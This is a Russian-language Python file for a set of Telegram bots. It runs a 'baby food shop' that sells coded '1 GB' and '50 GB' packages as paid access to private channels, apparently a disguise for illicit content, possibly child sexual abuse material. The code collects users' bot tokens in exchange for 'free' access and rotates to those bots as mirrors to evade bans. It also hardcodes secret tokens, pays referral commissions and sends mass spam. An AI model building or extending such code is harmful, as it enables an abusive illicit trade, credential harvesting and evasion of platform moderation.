# telegram_twin_bot_final.py
# Полный код с красивым дизайном, промокодами, категориями 1ГБ/50ГБ, исправленными логами
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, InputMediaPhoto
import sqlite3
import time
import threading
import requests
import random
import string
from datetime import datetime

# ========== КОНФИГУРАЦИЯ ==========
MAIN_BOT_TOKEN = "8919013227:AAE_63ez-hd17qEdq5po_k7N2CclzHicY0w"
WORKER_BOT_TOKEN = "8913951478:AAGpBtNbN7pa9Gqk9_inuaJIOgfTqbccmz0"
LOGGER_BOT_TOKEN = "8902065807:AAHk0oPacGI1A6RYoV_2Tr9x_Pcm5VOtv54"

REVIEWS_CHANNEL = "https://t.me/+7bOC6qtTw2s3NjBh"
SUBSCRIBE_CHANNEL = "https://t.me/+XvIHw0ai77ViZjdh"
ADMIN_ID = "8659313638"

# Фото (замени на реальные file_id)
PHOTO_PRODUCT_1GB = "AgACAgIAAxkBAAIB"   # ЗАМЕНИТЬ
PHOTO_PRODUCT_50GB = "AgACAgIAAxkBAAIC"  # ЗАМЕНИТЬ

# ========== БАЗА ДАННЫХ ==========
conn = sqlite3.connect('twin_bot.db', check_same_thread=False)
c = conn.cursor()

c.execute('''CREATE TABLE IF NOT EXISTS worker_bots 
             (token TEXT PRIMARY KEY, username TEXT, added_by TEXT, timestamp INTEGER, is_active INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS current_worker 
             (id INTEGER PRIMARY KEY, token TEXT, username TEXT, updated_at INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS payments 
             (user_id TEXT, amount INTEGER, category TEXT, timestamp INTEGER, ref_id TEXT, promo_used TEXT)''')
c.execute('''CREATE TABLE IF NOT EXISTS user_sessions 
             (user_id TEXT, temp_token TEXT, step TEXT, timestamp INTEGER, promo_discount INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS user_stats 
             (user_id TEXT, purchases INTEGER, tokens_submitted INTEGER, last_active INTEGER, ref_code TEXT, earned INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS referals 
             (code TEXT PRIMARY KEY, owner_id TEXT, earnings INTEGER, clicks INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS all_users 
             (user_id TEXT PRIMARY KEY, first_seen INTEGER, last_seen INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS user_logs 
             (user_id TEXT, action TEXT, details TEXT, timestamp INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS promo_codes 
             (code TEXT PRIMARY KEY, discount INTEGER, uses_left INTEGER, total_uses INTEGER, created_at INTEGER, is_active INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS user_promos 
             (user_id TEXT, promo_code TEXT, used_at INTEGER, discount_applied INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS user_promo_active 
             (user_id TEXT PRIMARY KEY, promo_code TEXT, discount INTEGER, expires_at INTEGER)''')
conn.commit()

# ========== ФУНКЦИИ ==========
def log_to_logger(text):
    try:
        url = f"https://api.telegram.org/bot{LOGGER_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": ADMIN_ID, "text": text[:4000]}, timeout=3)
    except:
        pass

def log_action(user_id, action, details=""):
    # Пишем только важные действия (покупка, смерть бота, добавление бота, ротация)
    important_actions = ["ОПЛАТА", "СДАН ТОКЕН", "РОТАЦИЯ", "МЁРТВ", "ДОБАВЛЕН БОТ", "ПРОМОКОД"]
    if any(x in action for x in important_actions):
        c.execute("INSERT INTO user_logs VALUES (?, ?, ?, ?)", (user_id, action, details, int(time.time())))
        conn.commit()
        log_to_logger(f"{action}: {details[:100]}")

def register_user(user_id, ref_code=None):
    c.execute("SELECT * FROM all_users WHERE user_id=?", (user_id,))
    if not c.fetchone():
        c.execute("INSERT INTO all_users VALUES (?, ?, ?)", (user_id, int(time.time()), int(time.time())))
        if ref_code and ref_code != user_id:
            c.execute("UPDATE referals SET clicks = clicks + 1 WHERE code=?", (ref_code,))
            c.execute("INSERT OR IGNORE INTO user_stats (user_id, purchases, tokens_submitted, last_active, ref_code, earned) VALUES (?, 0, 0, ?, ?, 0)",
                      (user_id, int(time.time()), ref_code))
    c.execute("UPDATE all_users SET last_seen=? WHERE user_id=?", (int(time.time()), user_id))
    conn.commit()

def generate_ref_code(user_id):
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    c.execute("INSERT OR REPLACE INTO user_stats (user_id, purchases, tokens_submitted, last_active, ref_code, earned) VALUES (?, COALESCE((SELECT purchases FROM user_stats WHERE user_id=?), 0), COALESCE((SELECT tokens_submitted FROM user_stats WHERE user_id=?), 0), ?, ?, COALESCE((SELECT earned FROM user_stats WHERE user_id=?), 0))",
              (user_id, user_id, user_id, int(time.time()), code, user_id))
    c.execute("INSERT OR IGNORE INTO referals (code, owner_id, earnings, clicks) VALUES (?, ?, 0, 0)", (code, user_id))
    conn.commit()
    return code

def add_commission(ref_code, amount):
    c.execute("SELECT owner_id FROM referals WHERE code=?", (ref_code,))
    row = c.fetchone()
    if row:
        owner = row[0]
        commission = int(amount * 0.4)
        c.execute("UPDATE referals SET earnings = earnings + ? WHERE code=?", (commission, ref_code))
        c.execute("UPDATE user_stats SET earned = earned + ? WHERE user_id=?", (commission, owner))
        conn.commit()
        log_action(owner, "КОМИССИЯ", f"{commission}₽ от реф {ref_code}")

def get_current_worker():
    c.execute("SELECT token, username FROM current_worker WHERE id=1")
    row = c.fetchone()
    if row:
        return row[0], row[1]
    set_current_worker(WORKER_BOT_TOKEN, "worker_bot")
    return WORKER_BOT_TOKEN, "worker_bot"

def set_current_worker(token, username):
    c.execute("DELETE FROM current_worker WHERE id=1")
    c.execute("INSERT INTO current_worker VALUES (1, ?, ?, ?)", (token, username, int(time.time())))
    conn.commit()

def check_bot_alive(token):
    try:
        r = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=5)
        if r.json().get('ok'):
            return True, r.json()['result']['username']
        return False, None
    except:
        return False, None

def add_worker_bot(token, username, added_by):
    c.execute("INSERT OR REPLACE INTO worker_bots VALUES (?, ?, ?, ?, 1)", (token, username, added_by, int(time.time())))
    conn.commit()
    log_action(added_by, "ДОБАВЛЕН БОТ", f"бот: @{username}")

def get_all_worker_bots():
    c.execute("SELECT token, username FROM worker_bots WHERE is_active=1 ORDER BY timestamp DESC")
    return c.fetchall()

def get_user_bots_count(user_id):
    c.execute("SELECT COUNT(*) FROM worker_bots WHERE added_by=? AND is_active=1", (user_id,))
    return c.fetchone()[0]

def rotate_worker():
    token, name = get_current_worker()
    alive, _ = check_bot_alive(token)
    if not alive:
        log_action("system", "БОТ МЁРТВ", f"бот: @{name}")
        for t, u in get_all_worker_bots():
            if t != token and check_bot_alive(t)[0]:
                set_current_worker(t, u)
                log_action("system", "РОТАЦИЯ", f"новый бот: @{u}")
                return True
        set_current_worker(WORKER_BOT_TOKEN, "worker_bot_default")
        log_action("system", "НЕТ ЖИВЫХ БОТОВ", "использую резервный")
    return True

def monitor_worker():
    while True:
        try:
            rotate_worker()
        except:
            pass
        time.sleep(600)

def ask_subscribe(chat_id):
    time.sleep(60)
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("📢 ПОДПИСАТЬСЯ", url=SUBSCRIBE_CHANNEL))
    try:
        worker_bot.send_message(chat_id, "🔔 ПОДПИШИСЬ, ЧТОБЫ НЕ ПОТЕРЯТЬ БОТА:", reply_markup=kb)
    except:
        pass

# ========== ПРОМОКОДЫ ==========
def create_promo_code(code, discount, uses_left):
    c.execute("INSERT OR REPLACE INTO promo_codes VALUES (?, ?, ?, ?, ?, 1)",
              (code, discount, uses_left, 0, int(time.time()), 1))
    conn.commit()
    log_action(ADMIN_ID, "СОЗДАН ПРОМОКОД", f"{code} - {discount}% - {uses_left} использований")

def delete_promo_code(code):
    c.execute("DELETE FROM promo_codes WHERE code=?", (code,))
    conn.commit()
    log_action(ADMIN_ID, "УДАЛЁН ПРОМОКОД", code)

def get_all_promos():
    c.execute("SELECT code, discount, uses_left, is_active FROM promo_codes ORDER BY created_at DESC")
    return c.fetchall()

def apply_promo_code(user_id, code):
    c.execute("SELECT discount, uses_left FROM promo_codes WHERE code=? AND is_active=1 AND uses_left>0", (code,))
    row = c.fetchone()
    if not row:
        return False, 0
    discount, uses_left = row
    # Применяем промокод к пользователю
    c.execute("INSERT OR REPLACE INTO user_promo_active (user_id, promo_code, discount, expires_at) VALUES (?, ?, ?, ?)",
              (user_id, code, discount, int(time.time()) + 3600))  # действует 1 час
    # Уменьшаем остаток использований
    c.execute("UPDATE promo_codes SET uses_left = uses_left - 1, total_uses = total_uses + 1 WHERE code=?", (code,))
    c.execute("INSERT INTO user_promos VALUES (?, ?, ?, ?)", (user_id, code, int(time.time()), discount))
    conn.commit()
    log_action(user_id, "ПРОМОКОД АКТИВИРОВАН", f"{code} - {discount}%")
    return True, discount

def get_user_promo(user_id):
    c.execute("SELECT promo_code, discount FROM user_promo_active WHERE user_id=? AND expires_at > ?", (user_id, int(time.time())))
    row = c.fetchone()
    if row:
        return row[0], row[1]
    return None, 0

def clear_user_promo(user_id):
    c.execute("DELETE FROM user_promo_active WHERE user_id=?", (user_id,))
    conn.commit()

# ========== БОТ-ЛОГГЕР ==========
logger_bot = telebot.TeleBot(LOGGER_BOT_TOKEN)

def admin_kb():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("📊 СТАТИСТИКА", callback_data="stats"),
        InlineKeyboardButton("🤖 БОТЫ", callback_data="bots"),
        InlineKeyboardButton("📜 ЛОГИ", callback_data="logs"),
        InlineKeyboardButton("📢 РАССЫЛКА", callback_data="spam"),
        InlineKeyboardButton("➕ ДОБАВИТЬ БОТА", callback_data="add_bot"),
        InlineKeyboardButton("📈 РЕФЕРАЛЫ", callback_data="refs"),
        InlineKeyboardButton("📊 ЗЕРКАЛА", callback_data="mirrors"),
        InlineKeyboardButton("🎟 ПРОМОКОДЫ", callback_data="promos")
    )
    return kb

@logger_bot.message_handler(commands=['start', 'admin'])
def admin_start(m):
    if str(m.from_user.id) != ADMIN_ID:
        logger_bot.reply_to(m, "❌ ДОСТУП ЗАПРЕЩЁН")
        return
    logger_bot.send_message(m.chat.id, "🔐 <b>АДМИН ПАНЕЛЬ</b>", parse_mode='HTML', reply_markup=admin_kb())

@logger_bot.callback_query_handler(func=lambda call: True)
def admin_cb(call):
    if str(call.from_user.id) != ADMIN_ID:
        logger_bot.answer_callback_query(call.id, "Доступ запрещён")
        return
    
    if call.data == "stats":
        c.execute("SELECT COUNT(*) FROM payments")
        pay = c.fetchone()[0]
        c.execute("SELECT COUNT(DISTINCT user_id) FROM payments")
        buyers = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM worker_bots WHERE is_active=1")
        bots = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM all_users")
        users = c.fetchone()[0]
        c.execute("SELECT SUM(amount) FROM payments")
        total = c.fetchone()[0] or 0
        c.execute("SELECT SUM(earnings) FROM referals")
        ref_earn = c.fetchone()[0] or 0
        text = f"📊 <b>СТАТИСТИКА</b>\n\n▫️ Оплат: {pay}\n▫️ Покупателей: {buyers}\n▫️ Ботов: {bots}\n▫️ Юзеров: {users}\n▫️ Сумма: {total}₽\n▫️ Реф. выплачено: {ref_earn}₽"
        logger_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=admin_kb())
    
    elif call.data == "bots":
        bots = get_all_worker_bots()
        if not bots:
            text = "🤖 <b>БОТЫ</b>\n\nНет ботов"
        else:
            text = "🤖 <b>БОТЫ</b>\n\n"
            for t, u in bots[:15]:
                alive, _ = check_bot_alive(t)
                text += f"▫️ @{u} — {'✅ жив' if alive else '❌ мёртв'}\n"
        logger_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=admin_kb())
    
    elif call.data == "logs":
        c.execute("SELECT action, details, timestamp FROM user_logs ORDER BY timestamp DESC LIMIT 20")
        logs = c.fetchall()
        if not logs:
            text = "📜 <b>ЛОГИ</b>\n\nНет логов"
        else:
            text = "📜 <b>ЛОГИ</b>\n\n"
            for action, details, ts in logs:
                dt = datetime.fromtimestamp(ts).strftime("%H:%M %d.%m")
                text += f"[{dt}] {action}: {details[:50]}\n"
        logger_bot.edit_message_text(text[:4000], call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=admin_kb())
    
    elif call.data == "spam":
        logger_bot.send_message(call.message.chat.id, "📢 <b>ВВЕДИ ТЕКСТ ДЛЯ РАССЫЛКИ:</b>", parse_mode='HTML')
        c.execute("INSERT OR REPLACE INTO user_sessions VALUES (?, ?, ?, ?)", (ADMIN_ID, "", "spam_mode", int(time.time())))
        conn.commit()
        logger_bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif call.data == "add_bot":
        logger_bot.send_message(call.message.chat.id, "➕ <b>ОТПРАВЬ ТОКЕН БОТА:</b>", parse_mode='HTML')
        c.execute("INSERT OR REPLACE INTO user_sessions VALUES (?, ?, ?, ?)", (ADMIN_ID, "", "add_bot_mode", int(time.time())))
        conn.commit()
        logger_bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif call.data == "refs":
        c.execute("SELECT code, owner_id, earnings, clicks FROM referals ORDER BY earnings DESC LIMIT 10")
        refs = c.fetchall()
        if not refs:
            text = "📈 <b>ТОП РЕФЕРАЛОВ</b>\n\nНет рефералов"
        else:
            text = "📈 <b>ТОП РЕФЕРАЛОВ</b>\n\n"
            for code, owner, earn, clicks in refs:
                text += f"▫️ {code} — {earn}₽ ({clicks} кликов)\n"
        logger_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=admin_kb())
    
    elif call.data == "mirrors":
        c.execute("SELECT added_by, COUNT(*) FROM worker_bots WHERE is_active=1 GROUP BY added_by ORDER BY COUNT(*) DESC LIMIT 10")
        mirrors = c.fetchall()
        if not mirrors:
            text = "📊 <b>ЗЕРКАЛА (ДОБАВЛЕННЫЕ БОТЫ)</b>\n\nНет добавленных ботов"
        else:
            text = "📊 <b>ЗЕРКАЛА (ДОБАВЛЕННЫЕ БОТЫ)</b>\n\n"
            for i, (user_id, count) in enumerate(mirrors, 1):
                text += f"{i}. {user_id} — {count} ботов\n"
        logger_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=admin_kb())
    
    elif call.data == "promos":
        promos = get_all_promos()
        if not promos:
            text = "🎟 <b>ПРОМОКОДЫ</b>\n\nНет промокодов\n\n➕ Создать: /create_promo код скидка_% лимит"
        else:
            text = "🎟 <b>ПРОМОКОДЫ</b>\n\n"
            for code, discount, left, active in promos:
                status = "✅" if active and left > 0 else "❌"
                text += f"{status} {code} — {discount}% (осталось: {left})\n"
            text += "\n➕ Создать: /create_promo код скидка_% лимит\n❌ Удалить: /del_promo код"
        logger_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=admin_kb())

@logger_bot.message_handler(commands=['create_promo'])
def create_promo_cmd(m):
    if str(m.from_user.id) != ADMIN_ID:
        return
    parts = m.text.split()
    if len(parts) != 4:
        logger_bot.reply_to(m, "❌ Формат: /create_promo код скидка_% лимит\nПример: /create_promo SUMMER10 10 100")
        return
    _, code, discount, limit = parts
    try:
        discount = int(discount)
        limit = int(limit)
        if discount not in [10, 20]:
            logger_bot.reply_to(m, "❌ Скидка только 10% или 20%")
            return
        create_promo_code(code.upper(), discount, limit)
        logger_bot.reply_to(m, f"✅ Промокод {code.upper()} создан! Скидка {discount}%, {limit} использований")
    except:
        logger_bot.reply_to(m, "❌ Ошибка в формате")

@logger_bot.message_handler(commands=['del_promo'])
def del_promo_cmd(m):
    if str(m.from_user.id) != ADMIN_ID:
        return
    parts = m.text.split()
    if len(parts) != 2:
        logger_bot.reply_to(m, "❌ Формат: /del_promo код")
        return
    code = parts[1].upper()
    delete_promo_code(code)
    logger_bot.reply_to(m, f"✅ Промокод {code} удалён")

@logger_bot.message_handler(func=lambda m: True)
def admin_text(m):
    if str(m.from_user.id) != ADMIN_ID:
        return
    c.execute("SELECT step FROM user_sessions WHERE user_id=?", (ADMIN_ID,))
    row = c.fetchone()
    if not row:
        return
    step = row[0]
    if step == "spam_mode":
        c.execute("SELECT user_id FROM all_users")
        users = c.fetchall()
        sent = 0
        failed = 0
        for (uid,) in users:
            try:
                logger_bot.send_message(uid, m.text, parse_mode='HTML')
                sent += 1
                time.sleep(0.05)
            except:
                failed += 1
        logger_bot.reply_to(m, f"✅ РАССЫЛКА ЗАВЕРШЕНА\n📨 Отправлено: {sent}\n❌ Ошибок: {failed}")
        c.execute("DELETE FROM user_sessions WHERE user_id=?", (ADMIN_ID,))
        conn.commit()
    elif step == "add_bot_mode":
        token = m.text.strip()
        if ':' not in token:
            logger_bot.reply_to(m, "❌ НЕВЕРНЫЙ ФОРМАТ ТОКЕНА")
            return
        alive, username = check_bot_alive(token)
        if not alive:
            logger_bot.reply_to(m, "❌ БОТ НЕ СУЩЕСТВУЕТ ИЛИ ЗАБЛОКИРОВАН")
            return
        add_worker_bot(token, username, ADMIN_ID)
        logger_bot.reply_to(m, f"✅ БОТ @{username} ДОБАВЛЕН В БАЗУ")
        c.execute("DELETE FROM user_sessions WHERE user_id=?", (ADMIN_ID,))
        conn.commit()

# ========== ОСНОВНОЙ БОТ ==========
main_bot = telebot.TeleBot(MAIN_BOT_TOKEN)

@main_bot.message_handler(commands=['start'])
def main_start(m):
    user_id = str(m.from_user.id)
    register_user(user_id)
    token, username = get_current_worker()
    alive, real_username = check_bot_alive(token)
    if not alive:
        rotate_worker()
        token, username = get_current_worker()
        alive, real_username = check_bot_alive(token)
    if alive and real_username:
        username = real_username
    text = f"🤖 <b>АКТУАЛЬНЫЙ БОТ</b>\n\n@{username}\n\n👇 Нажми на username выше"
    main_bot.reply_to(m, text, parse_mode='HTML')

# ========== РАБОЧИЙ БОТ ==========
worker_bot = telebot.TeleBot(WORKER_BOT_TOKEN)

def worker_menu():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("🛒 МАГАЗИН", callback_data="shop"),
        InlineKeyboardButton("🍼 БЕСПЛАТНОЕ ПИТАНИЕ", callback_data="free"),
        InlineKeyboardButton("⭐ ОТЗЫВЫ", callback_data="reviews"),
        InlineKeyboardButton("📈 МОЯ РЕФЕРАЛКА", callback_data="my_ref"),
        InlineKeyboardButton("🎟 ПРОМОКОД", callback_data="promo")
    )
    return kb

@worker_bot.message_handler(commands=['start'])
def worker_start(m):
    user_id = str(m.from_user.id)
    ref_code = None
    if ' ' in m.text:
        parts = m.text.split()
        if len(parts) > 1:
            ref_code = parts[1].replace('ref_', '')
    register_user(user_id, ref_code)
    
    c.execute("SELECT ref_code FROM user_stats WHERE user_id=?", (user_id,))
    row = c.fetchone()
    if not row or not row[0]:
        generate_ref_code(user_id)
    
    text = "🍼 <b>ДЕТСКОЕ ПИТАНИЕ SHOP</b>\n\nВыбери действие в меню ниже:"
    worker_bot.send_message(m.chat.id, text, parse_mode='HTML', reply_markup=worker_menu())
    threading.Thread(target=ask_subscribe, args=(m.chat.id,), daemon=True).start()

@worker_bot.callback_query_handler(func=lambda call: True)
def worker_cb(call):
    user_id = str(call.from_user.id)
    
    if call.data == "reviews":
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("⭐ КАНАЛ С ОТЗЫВАМИ", url=REVIEWS_CHANNEL))
        kb.add(InlineKeyboardButton("🔙 НАЗАД", callback_data="back"))
        worker_bot.edit_message_text("⭐ <b>ОТЗЫВЫ НАШИХ КЛИЕНТОВ</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=kb)
    
    elif call.data == "shop":
        kb = InlineKeyboardMarkup(row_width=1)
        kb.add(
            InlineKeyboardButton("💾 1 ГБ", callback_data="buy_1gb"),
            InlineKeyboardButton("💿 50 ГБ", callback_data="buy_50gb"),
            InlineKeyboardButton("🔙 НАЗАД", callback_data="back")
        )
        worker_bot.edit_message_text("📦 <b>ВЫБЕРИ ОБЪЁМ:</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=kb)
    
    elif call.data == "buy_1gb":
        promo_code, discount = get_user_promo(user_id)
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("💳 ОПЛАТИТЬ", url="https://t.me/+KIYBiERHtzMzZmVi"))
        kb.add(InlineKeyboardButton("🔙 НАЗАД", callback_data="shop"))
        
        if discount > 0:
            caption = f"💾 <b>1 ГБ</b>\n\n✨ ПРИМЕНЁН ПРОМОКОД: -{discount}%\n\n💳 После оплаты вам автоматически добавит в канал"
            log_action(user_id, "ОПЛАТА 1ГБ", f"скидка {discount}% по промокоду {promo_code}")
            clear_user_promo(user_id)
        else:
            caption = "💾 <b>1 ГБ</b>\n\n💳 После оплаты вам автоматически добавит в канал"
            log_action(user_id, "ОПЛАТА 1ГБ", "")
        
        try:
            worker_bot.edit_message_media(
                InputMediaPhoto(PHOTO_PRODUCT_1GB, caption=caption, parse_mode='HTML'),
                call.message.chat.id, call.message.message_id, reply_markup=kb
            )
        except:
            worker_bot.edit_message_text(f"💾 1 ГБ\n\n{'✨ ПРОМОКОД АКТИВЕН! ' if discount > 0 else ''}\nПосле оплаты автоматически добавит в канал", call.message.chat.id, call.message.message_id, reply_markup=kb)
    
    elif call.data == "buy_50gb":
        promo_code, discount = get_user_promo(user_id)
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("💳 ОПЛАТИТЬ", url="https://t.me/+JgSRSMJp6ww4MzUy"))
        kb.add(InlineKeyboardButton("🔙 НАЗАД", callback_data="shop"))
        
        if discount > 0:
            caption = f"💿 <b>50 ГБ</b>\n\n✨ ПРИМЕНЁН ПРОМОКОД: -{discount}%\n\n💳 После оплаты вам автоматически добавит в канал"
            log_action(user_id, "ОПЛАТА 50ГБ", f"скидка {discount}% по промокоду {promo_code}")
            clear_user_promo(user_id)
        else:
            caption = "💿 <b>50 ГБ</b>\n\n💳 После оплаты вам автоматически добавит в канал"
            log_action(user_id, "ОПЛАТА 50ГБ", "")
        
        try:
            worker_bot.edit_message_media(
                InputMediaPhoto(PHOTO_PRODUCT_50GB, caption=caption, parse_mode='HTML'),
                call.message.chat.id, call.message.message_id, reply_markup=kb
            )
        except:
            worker_bot.edit_message_text(f"💿 50 ГБ\n\n{'✨ ПРОМОКОД АКТИВЕН! ' if discount > 0 else ''}\nПосле оплаты автоматически добавит в канал", call.message.chat.id, call.message.message_id, reply_markup=kb)
    
    elif call.data == "free":
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("🤖 СОЗДАТЬ БОТА", url="https://t.me/botfather"))
        kb.add(InlineKeyboardButton("📤 ОТПРАВИТЬ ТОКЕН", callback_data="send_token"))
        kb.add(InlineKeyboardButton("🔙 НАЗАД", callback_data="back"))
        worker_bot.edit_message_text("🍼 <b>БЕСПЛАТНОЕ ПИТАНИЕ</b>\n\n1. Создай бота в @BotFather\n2. Отправь его токен сюда\n3. Получи ссылку на бесплатный канал", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=kb)
    
    elif call.data == "send_token":
        worker_bot.send_message(call.message.chat.id, "📝 <b>ОТПРАВЬ ТОКЕН СВОЕГО БОТА</b>\n\nФормат: <code>1234567890:ABCdefGHIjklmNOPqrstUvwXYZ</code>", parse_mode='HTML')
        c.execute("INSERT OR REPLACE INTO user_sessions VALUES (?, ?, ?, ?)", (user_id, "", "awaiting_token", int(time.time())))
        conn.commit()
        worker_bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif call.data == "my_ref":
        c.execute("SELECT ref_code, earned FROM user_stats WHERE user_id=?", (user_id,))
        row = c.fetchone()
        if not row or not row[0]:
            code = generate_ref_code(user_id)
            earned = 0
        else:
            code, earned = row
        bot_username = worker_bot.get_me().username
        text = f"📈 <b>ТВОЯ РЕФЕРАЛЬНАЯ ССЫЛКА</b>\n\n<code>https://t.me/{bot_username}?start=ref_{user_id}</code>\n\n💰 <b>ЗАРАБОТАНО:</b> {earned}₽\n👥 40% с каждой продажи твоих рефералов"
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("🔙 НАЗАД", callback_data="back"))
        worker_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=kb)
    
    elif call.data == "promo":
        worker_bot.send_message(call.message.chat.id, "🎟 <b>ВВЕДИ ПРОМОКОД</b>\n\nЕсли у тебя есть промокод — отправь его одним сообщением", parse_mode='HTML')
        c.execute("INSERT OR REPLACE INTO user_sessions VALUES (?, ?, ?, ?)", (user_id, "", "awaiting_promo", int(time.time())))
        conn.commit()
        worker_bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif call.data == "back":
        worker_bot.edit_message_text("🍼 <b>ДЕТСКОЕ ПИТАНИЕ SHOP</b>\n\nВыбери действие в меню ниже:", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=worker_menu())

@worker_bot.message_handler(func=lambda m: True)
def worker_text_handler(m):
    user_id = str(m.from_user.id)
    c.execute("SELECT step FROM user_sessions WHERE user_id=?", (user_id,))
    row = c.fetchone()
    if not row:
        return
    step = row[0]
    
    if step == "awaiting_token":
        token = m.text.strip()
        if ':' not in token:
            worker_bot.reply_to(m, "❌ НЕВЕРНЫЙ ФОРМАТ ТОКЕНА\nФормат: <code>1234567890:ABCdef...</code>", parse_mode='HTML')
            return
        alive, username = check_bot_alive(token)
        if not alive:
            worker_bot.reply_to(m, "❌ БОТ НЕ СУЩЕСТВУЕТ ИЛИ ЗАБЛОКИРОВАН")
            return
        add_worker_bot(token, username, user_id)
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("🍼 ПОЛУЧИТЬ БЕСПЛАТНО", url="https://t.me/+fEQI916fF2ZkNDMx"))
        worker_bot.send_message(m.chat.id, f"✅ ТОКЕН ПРИНЯТ! БОТ @{username} ДОБАВЛЕН В БАЗУ\n\n🎁 ТВОЯ ССЫЛКА НА БЕСПЛАТНЫЙ ДОСТУП:", reply_markup=kb)
        c.execute("DELETE FROM user_sessions WHERE user_id=?", (user_id,))
        conn.commit()
    
    elif step == "awaiting_promo":
        code = m.text.strip().upper()
        success, discount = apply_promo_code(user_id, code)
        if success:
            worker_bot.reply_to(m, f"✅ ПРОМОКОД {code} АКТИВИРОВАН!\n🎉 СКИДКА {discount}% НА СЛЕДУЮЩУЮ ПОКУПКУ")
        else:
            worker_bot.reply_to(m, "❌ НЕВЕРНЫЙ ИЛИ ПРОСРОЧЕННЫЙ ПРОМОКОД")
        c.execute("DELETE FROM user_sessions WHERE user_id=?", (user_id,))
        conn.commit()
        # Возвращаем в главное меню
        worker_bot.send_message(m.chat.id, "🍼 ДЕТСКОЕ ПИТАНИЕ SHOP", reply_markup=worker_menu())

# ========== ЗАПУСК ==========
def run_bot(bot_instance, name):
    while True:
        try:
            print(f"✅ {name} ЗАПУЩЕН")
            bot_instance.polling(none_stop=True, interval=3, timeout=30)
        except Exception as e:
            print(f"❌ {name}: {e}")
            time.sleep(5)

if __name__ == "__main__":
    alive, username = check_bot_alive(WORKER_BOT_TOKEN)
    if not alive:
        username = "worker_bot"
    add_worker_bot(WORKER_BOT_TOKEN, username, "system")
    set_current_worker(WORKER_BOT_TOKEN, username)
    
    threading.Thread(target=monitor_worker, daemon=True).start()
    threading.Thread(target=run_bot, args=(main_bot, "ОСНОВНОЙ"), daemon=True).start()
    threading.Thread(target=run_bot, args=(worker_bot, "РАБОЧИЙ"), daemon=True).start()
    threading.Thread(target=run_bot, args=(logger_bot, "ЛОГГЕР"), daemon=True).start()
    
    log_to_logger("🚀 ВСЕ БОТЫ ЗАПУЩЕНЫ")
    print("✅ ВСЕ БОТЫ РАБОТАЮТ")
    print("📌 АДМИН ID:", ADMIN_ID)
    print("📌 КОМАНДЫ В ЛОГГЕРЕ: /admin, /create_promo код % лимит, /del_promo код")
    
    while True:
        time.sleep(1)